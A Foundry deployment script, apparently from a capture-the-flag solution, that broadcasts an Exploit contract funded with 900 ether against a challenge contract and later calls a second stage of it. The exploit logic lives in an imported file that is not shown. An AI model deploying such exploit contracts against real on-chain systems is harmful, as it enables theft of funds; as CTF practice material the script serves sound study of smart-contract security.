// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../test/Exploit.t.sol";
import "forge-std/console2.sol";

contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
        Exploit exploit = new Exploit{value: 900 ether}();
        exploit.run(challenge);
        console2.log(address(exploit));
        console2.log(address(challenge.TOKEN()));

        vm.stopBroadcast();
    }
}

contract ExploitScript1 is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Exploit exploit = Exploit(0xF7d50395A605a7A353452e070d5629a164f9a58A);
        exploit.run1();

        vm.stopBroadcast();
    }
}
